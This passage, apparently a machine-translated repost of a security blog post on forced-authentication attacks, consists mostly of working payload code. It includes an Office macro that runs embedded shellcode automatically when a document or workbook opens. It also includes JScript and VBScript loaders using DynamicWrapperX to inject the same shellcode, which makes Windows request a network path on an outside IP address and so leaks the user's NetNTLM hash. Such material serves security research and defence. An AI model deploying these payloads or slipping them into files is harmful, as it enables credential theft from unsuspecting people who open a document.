"kernel32" ( _<br/>        ByVal Destination  As LongPtr, _<br/>        ByRef Source As Any, _<br/>        ByVal Length As Long) As LongPtr<br/> <br/>#Else<br/>    Private Declare Function CreateThread Lib "kernel32" ( _<br/>        ByVal lpThreadAttributes As Long, _<br/>        ByVal dwStackSize As Long, _<br/>        ByVal lpStartAddress As Long, _<br/>        lpParameter As Long, _<br/>        ByVal dwCreationFlags As Long, _<br/>        lpThreadId As Long) As Long<br/> <br/>    Private Declare Function VirtualAlloc Lib "kernel32" ( _<br/>        ByVal lpAddress As Long, _<br/>        ByVal dwSize As Long, _<br/>        ByVal flAllocationType As Long, _<br/>        ByVal flProtect As Long) As Long<br/> <br/>    Private Declare Function RtlMoveMemory Lib "kernel32" ( _<br/>        ByVal Destination As Long, _<br/>        ByRef Source As Any, _<br/>        ByVal Length As Long) As Long<br/>#EndIf<br/> <br/>Const MEM_COMMIT = &amp;H1000<br/>Const PAGE_EXECUTE_READWRITE = &amp;H40<br/> <br/>Sub Auto_Open()<br/>    Dim source As Long, i As Long<br/>#If Vba7 Then<br/>    Dim  lpMemory As LongPtr, lResult As LongPtr<br/>#Else<br/>    Dim  lpMemory As Long, lResult As Long<br/>#EndIf<br/> <br/>    Dim bShellcode(376) As Byte<br/>        bShellcode(0) = 232<br/>        bShellcode(1) = 255<br/>        bShellcode(2) = 255<br/>        bShellcode(3) = 255<br/>        bShellcode(4) = 255<br/>        bShellcode(5) = 192<br/>        bShellcode(6) = 95<br/>        bShellcode(7) = 185<br/>        bShellcode(8) = 85<br/>        bShellcode(9) = 3<br/>        bShellcode(10) = 2<br/>        bShellcode(11) = 2<br/>        bShellcode(12) = 129<br/>        bShellcode(13) = 241<br/>        bShellcode(14) = 2<br/>        bShellcode(15) = 2<br/>        bShellcode(16) = 2<br/>                .....................<br/>lpMemory = VirtualAlloc(0, UBound(bShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br/>    For i = LBound(bShellcode) To UBound(bShellcode)<br/>        source = bShellcode(i)<br/>        lResult = RtlMoveMemory(lpMemory + i, source, 1)<br/>    Next i<br/>    lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)<br/>End Sub<br/>Sub AutoOpen()<br/>    Auto_Open<br/>End Sub<br/>Sub Workbook_Open()<br/>    Auto_Open<br/>End Sub</span></pre><p id="28a2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mg" href="https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba" rel="noopener ugc nofollow" target="_blank">https://github . com/OsandaMalith/Shellcodes/blob/master/create file/create file . VBA</a></p><h1 id="c1f9" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">VBS和JS内部的外壳代码</h1><p id="a830" class="pw-post-body-paragraph jq jr it js b jt lm jv jw jx ln jz ka kb lo kd ke kf lp kh ki kj lq kl km kn im bi translated">subTee用JS和DynamicWrapperX做了很多种类的研究。您可以使用DynamicWrapperX DLL找到POC。<br/><a class="ae mg" href="http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html" rel="noopener ugc nofollow" target="_blank">http://subtox 10 . blogspot . com/2016/09/shellcode-via-jscript-VBScript . html</a><br/>在此基础上我将shellcode移植到了JS和VBS。有趣的是，我们可以在html和。hta格式。<br/>请注意，以下外壳代码指向我的IP。</p><h1 id="b6fe" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">JScript</h1><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="224c" class="mb kp it lx b gy mc md l me mf">/*<br/> * Author : Osanda Malith Jayathissa (<a class="ae mg" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a>)<br/> * Title: Shellcode to request a non-existing network path<br/> * Website: <a class="ae mg" href="https://osandamalith.com" rel="noopener ugc nofollow" target="_blank">https://osandamalith.com</a><br/> * Shellcode : <a class="ae mg" href="https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html" rel="noopener ugc nofollow" target="_blank">https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html</a><br/> * Based on subTee's JS: <a class="ae mg" href="https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04</a><br/> */<br/>DX = new ActiveXObject("DynamicWrapperX"); <br/>DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");<br/>DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );<br/>DX.Register("kernel32.dll", "WaitForSingleObject", "i=uu", "r=u");<br/> <br/>var MEM_COMMIT = 0x1000;<br/>var PAGE_EXECUTE_READWRITE = 0x40;<br/> <br/>var sc = [<br/>0xe8, 0xff, 0xff, 0xff, 0xff, 0xc0, 0x5f, 0xb9, 0x55, 0x03, 0x02, 0x02, 0x81, 0xf1, 0x02, 0x02, 0x02, 0x02, 0x83, 0xc7,<br/>0x1d, 0x33, 0xf6, 0xfc, 0x8a, 0x07, 0x3c, 0x05, 0x0f, 0x44, 0xc6, 0xaa, 0xe2, 0xf6, 0xe8, 0x05, 0x05, 0x05, 0x05, 0x5e,<br/>0x8b, 0xfe, 0x81, 0xc6, 0x29, 0x01, 0x05, 0x05, 0xb9, 0x02, 0x05, 0x05, 0x05, 0xfc, 0xad, 0x01, 0x3c, 0x07, 0xe2, 0xfa,<br/>0x56, 0xb9, 0x8d, 0x10, 0xb7, 0xf8, 0xe8, 0x5f, 0x05, 0x05, 0x05, 0x68, 0x31, 0x01, 0x05, 0x05, 0xff, 0xd0, 0xb9, 0xe0,<br/>0x53, 0x31, 0x4b, 0xe8, 0x4e, 0x05, 0x05, 0x05, 0xb9, 0xac, 0xd5, 0xaa, 0x88, 0x8b, 0xf0, 0xe8, 0x42, 0x05, 0x05, 0x05,<br/>0x6a, 0x05, 0x68, 0x80, 0x05, 0x05, 0x05, 0x6a, 0x03, 0x6a, 0x05, 0x6a, 0x01, 0x68, 0x05, 0x05, 0x05, 0x80, 0x68, 0x3e,<br/>0x01, 0x05, 0x05, 0xff, 0xd0, 0x6a, 0x05, 0xff, 0xd6, 0x33, 0xc0, 0x5e, 0xc3, 0x33, 0xd2, 0xeb, 0x10, 0xc1, 0xca, 0x0d,<br/>0x3c, 0x61, 0x0f, 0xbe, 0xc0, 0x7c, 0x03, 0x83, 0xe8, 0x20, 0x03, 0xd0, 0x41, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xea, 0x8b,<br/>0xc2, 0xc3, 0x8d, 0x41, 0xf8, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x14, 0x53, 0x56, 0x57, 0x89, 0x4d, 0xf4, 0x64, 0xa1,<br/>0x30, 0x05, 0x05, 0x05, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x14, 0x89, 0x45, 0xec, 0x8b,<br/>0xf8, 0x8b, 0xcf, 0xe8, 0xd2, 0xff, 0xff, 0xff, 0x8b, 0x70, 0x18, 0x8b, 0x3f, 0x85, 0xf6, 0x74, 0x4f, 0x8b, 0x46, 0x3c,<br/>0x8b, 0x5c, 0x30, 0x78, 0x85, 0xdb, 0x74, 0x44, 0x8b, 0x4c, 0x33, 0x0c, 0x03, 0xce, 0xe8, 0x96, 0xff, 0xff, 0xff, 0x8b,<br/>0x4c, 0x33, 0x20, 0x89, 0x45, 0xf8, 0x33, 0xc0, 0x03, 0xce, 0x89, 0x4d, 0xf0, 0x89, 0x45, 0xfc, 0x39, 0x44, 0x33, 0x18,<br/>0x76, 0x22, 0x8b, 0x0c, 0x81, 0x03, 0xce, 0xe8, 0x75, 0xff, 0xff, 0xff, 0x03, 0x45, 0xf8, 0x39, 0x45, 0xf4, 0x74, 0x1c,<br/>0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xf0, 0x40, 0x89, 0x45, 0xfc, 0x3b, 0x44, 0x33, 0x18, 0x72, 0xde, 0x3b, 0x7d, 0xec, 0x75,<br/>0x9c, 0x33, 0xc0, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0x4d, 0xfc, 0x8b, 0x44, 0x33, 0x24, 0x8d, 0x04, 0x48, 0x0f, 0xb7,<br/>0x0c, 0x30, 0x8b, 0x44, 0x33, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x30, 0x03, 0xc6, 0xeb, 0xdf, 0x21, 0x05, 0x05, 0x05,<br/>0x50, 0x05, 0x05, 0x05, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x05, 0x2f, 0x2f, 0x33,<br/>0x35, 0x2e, 0x31, 0x36, 0x34, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x34, 0x2f, 0x61, 0x61, 0x05];<br/> <br/>var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); <br/>for(var i = 0; i &lt; sc.length; i++) DX.NumPut(sc[i],scLocation,i);<br/>var thread = DX.CreateThread(0,0,scLocation,0,0);</span></pre><p id="f7ed" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mg" href="https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js" rel="noopener ugc nofollow" target="_blank">https://github . com/OsandaMalith/Shellcodes/blob/master/create file/create file . js</a></p><h1 id="f876" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">VBScript</h1><pre class="ls lt lu lv gt lw lx ly lz aw ma bi"><span id="532b" class="mb kp it lx b gy mc md l me mf">' Author : Osanda Malith Jayathissa (<a class="ae mg" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a>)<br/>' Title: Shellcode to request a non-existing network path<br/>' Website: <a class="ae mg" href="https://osandamalith.com" rel="noopener ugc nofollow" target="_blank">https://osandamalith.com</a><br/>' Shellcode : <a class="ae mg" href="https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html" rel="noopener ugc nofollow" target="_blank">https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html</a><br/>' Based on subTee's JS: <a class="ae mg" href="https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04</a><br/> <br/>Set DX = CreateObject("DynamicWrapperX")<br/>DX.Register "kernel32.dll", "VirtualAlloc", "i=luuu", "r=u"<br/>DX.Register "kernel32.dll","CreateThread","i=uullu","r=u"<br/>DX.Register "kernel32.dll", "WaitForSingleObject", "i=uu", "r=u"<br/> <br/>Const MEM_COMMIT = &amp;H1000<br/>Const PAGE_EXECUTE_READWRITE = &amp;H40<br/> <br/>shellcode = Array( _<br/>&amp;He8, &amp;Hff, &amp;Hff, &amp;Hff, &amp;Hff, &amp;Hc0, &amp;H5f, &amp;Hb9, &amp;H55, &amp;H03, &amp;H02, &amp;H02, &amp;H81, &amp;Hf1, &amp;H02, &amp;H02, &amp;H02, &amp;H02, &amp;H83, &amp;Hc7, _<br/>&amp;H1d, &amp;H33, &amp;Hf6, &amp;Hfc, &amp;H8a, &amp;H07, &amp;H3c, &amp;H05, &amp;H0f, &amp;H44, &amp;Hc6, &amp;Haa, &amp;He2, &amp;Hf6, &amp;He8, &amp;H05, &amp;H05, &amp;H05, &amp;H05, &amp;H5e, _<br/>&amp;H8b, &amp;Hfe, &amp;H81, &amp;Hc6, &amp;H29, &amp;H01, &amp;H05, &amp;H05, &amp;Hb9, &amp;H02, &amp;H05, &amp;H05, &amp;H05, &amp;Hfc, &amp;Had, &amp;H01, &amp;H3c, &amp;H07, &amp;He2, &amp;Hfa, _<br/>&amp;H56, &amp;Hb9, &amp;H8d, &amp;H10, &amp;Hb7, &amp;Hf8, &amp;He8, &amp;H5f, &amp;H05, &amp;H05, &amp;H05, &amp;H68, &amp;H31, &amp;H01, &amp;H05, &amp;H05, &amp;Hff, &amp;Hd0, &amp;Hb9, &amp;He0, _ <br/>&amp;H53, &amp;H31, &amp;H4b, &amp;He8, &amp;H4e, &amp;H05, &amp;H05, &amp;H05, &amp;Hb9, &amp;Hac, &amp;Hd5, &amp;Haa, &amp;H88, &amp;H8b, &amp;Hf0, &amp;He8, &amp;H42, &amp;H05, &amp;H05, &amp;H05, _<br/>&amp;H6a, &amp;H05, &amp;H68, &amp;H80, &amp;H05, &amp;H05, &amp;H05, &amp;H6a, &amp;H03, &amp;H6a, &amp;H05, &amp;H6a, &amp;H01, &amp;H68, &amp;H05, &amp;H05, &amp;H05, &amp;H80, &amp;H68, &amp;H3e, _<br/>&amp;H01, &amp;H05, &amp;H05, &amp;Hff, &amp;Hd0, &amp;H6a, &amp;H05, &amp;Hff, &amp;Hd6, &amp;H33, &amp;Hc0, &amp;H5e, &amp;Hc3, &amp;H33, &amp;Hd2, &amp;Heb, &amp;H10, &amp;Hc1, &amp;Hca, &amp;H0d, _<br/>&amp;H3c, &amp;H61, &amp;H0f, &amp;Hbe, &amp;Hc0, &amp;H7c, &amp;H03, &amp;H83, &amp;He8, &amp;H20, &amp;H03, &amp;Hd0, &amp;H41, &amp;H8a, &amp;H01, &amp;H84, &amp;Hc0, &amp;H75, &amp;Hea, &amp;H8b, _<br/>&amp;Hc2, &amp;Hc3, &amp;H8d, &amp;H41, &amp;Hf8, &amp;Hc3, &amp;H55, &amp;H8b, &amp;Hec, &amp;H83, &amp;Hec, &amp;H14, &amp;H53, &amp;H56, &amp;H57, &amp;H89, &amp;H4d, &amp;Hf4, &amp;H64, &amp;Ha1, _<br/>&amp;H30, &amp;H05, &amp;H05, &amp;H05, &amp;H89, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H40, &amp;H0c, &amp;H8b, &amp;H40, &amp;H14, &amp;H89, &amp;H45, &amp;Hec, &amp;H8b, _<br/>&amp;Hf8, &amp;H8b, &amp;Hcf, &amp;He8, &amp;Hd2, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H8b, &amp;H70, &amp;H18, &amp;H8b, &amp;H3f, &amp;H85, &amp;Hf6, &amp;H74, &amp;H4f, &amp;H8b, &amp;H46, &amp;H3c, _ <br/>&amp;H8b, &amp;H5c, &amp;H30, &amp;H78, &amp;H85, &amp;Hdb, &amp;H74, &amp;H44, &amp;H8b, &amp;H4c, &amp;H33, &amp;H0c, &amp;H03, &amp;Hce, &amp;He8, &amp;H96, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H8b, _<br/>&amp;H4c, &amp;H33, &amp;H20, &amp;H89, &amp;H45, &amp;Hf8, &amp;H33, &amp;Hc0, &amp;H03, &amp;Hce, &amp;H89, &amp;H4d, &amp;Hf0, &amp;H89, &amp;H45, &amp;Hfc, &amp;H39, &amp;H44, &amp;H33, &amp;H18, _<br/>&amp;H76, &amp;H22, &amp;H8b, &amp;H0c, &amp;H81, &amp;H03, &amp;Hce, &amp;He8, &amp;H75, &amp;Hff, &amp;Hff, &amp;Hff, &amp;H03, &amp;H45, &amp;Hf8, &amp;H39, &amp;H45, &amp;Hf4, &amp;H74, &amp;H1c, _<br/>&amp;H8b, &amp;H45, &amp;Hfc, &amp;H8b, &amp;H4d, &amp;Hf0, &amp;H40, &amp;H89, &amp;H45, &amp;Hfc, &amp;H3b, &amp;H44, &amp;H33, &amp;H18, &amp;H72, &amp;Hde, &amp;H3b, &amp;H7d, &amp;Hec, &amp;H75, _<br/>&amp;H9c, &amp;H33, &amp;Hc0, &amp;H5f, &amp;H5e, &amp;H5b, &amp;Hc9, &amp;Hc3, &amp;H8b, &amp;H4d, &amp;Hfc, &amp;H8b, &amp;H44, &amp;H33, &amp;H24, &amp;H8d, &amp;H04, &amp;H48, &amp;H0f, &amp;Hb7, _<br/>&amp;H0c, &amp;H30, &amp;H8b, &amp;H44, &amp;H33, &amp;H1c, &amp;H8d, &amp;H04, &amp;H88, &amp;H8b, &amp;H04, &amp;H30, &amp;H03, &amp;Hc6, &amp;Heb, &amp;Hdf, &amp;H21, &amp;H05, &amp;H05, &amp;H05, _<br/>&amp;H50, &amp;H05, &amp;H05, &amp;H05, &amp;H6b, &amp;H65, &amp;H72, &amp;H6e, &amp;H65, &amp;H6c, &amp;H33, &amp;H32, &amp;H2e, &amp;H64, &amp;H6c, &amp;H6c, &amp;H05, &amp;H2f, &amp;H2f, &amp;H33, _<br/>&amp;H35, &amp;H2e, &amp;H31, &amp;H36, &amp;H34, &amp;H2e, &amp;H31, &amp;H35, &amp;H33, &amp;H2e, &amp;H32, &amp;H32, &amp;H34, &amp;H2f, &amp;H61, &amp;H61, &amp;H05)<br/> <br/>scLocation = DX.VirtualAlloc(0, UBound(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br/> <br/>For i =LBound(shellcode) to UBound(shellcode)<br/>    DX.NumPut shellcode(i),scLocation,i<br/>Next<br/> <br/>thread = DX.CreateThread (0,0,scLocation,0,0)</span></pre><p id="52fc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><a class="ae mg" href="https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs" rel="noopener ugc nofollow" target="_blank">https://github . com/OsandaMalith/Shellcodes/blob/master/create file/create file . VBS</a></p><p id="c792" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在Windows中可能有许多其他方法。你永远不知道！🙂</p><h1 id="9e79" class="ko kp it bd kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll bi translated">参考</h1><div class="mv mw gp gr mx my"><a href="https://attack.mitre.org/techniques/T1187/" rel="noopener  ugc nofollow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">强制认证</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">服务器消息块(SMB)协议通常在Windows网络中用于身份验证和通信…</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">attack.mitre.org</p></div></div><div class="nh l"><div class="ni l nj nk nl nh nm mj my"/></div></div></a></div><figure class="ls lt lu lv gt mi"><div class="bz fp l di"><div class="ml mm l"/></div></figure></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><p id="d103" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><em class="lr">原载于2017年3月24日</em><a class="ae mg" href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" rel="noopener ugc nofollow" target="_blank"><em class="lr">http://osandamalith.com</em></a><em class="lr">。</em></p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><p id="a15b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><em class="lr">关注</em> <a class="ae mg" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="lr"> Infosec报道</em> </a> <em class="lr">获取更多此类精彩报道。</em></p><div class="mv mw gp gr mx my"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mz ab fo"><div class="na ab nb cl cj nc"><h2 class="bd iu gy z fp nd fr fs ne fu fw is bi translated">信息安全报道</h2><div class="nf l"><h3 class="bd b gy z fp nd fr fs ne fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ng l"><p class="bd b dl z fp nd fr fs ne fu fw dk translated">medium.com</p></div></div><div class="nh l"><div class="nu l nj nk nl nh nm mj my"/></div></div></a></div></div></div>    
</body>
</html>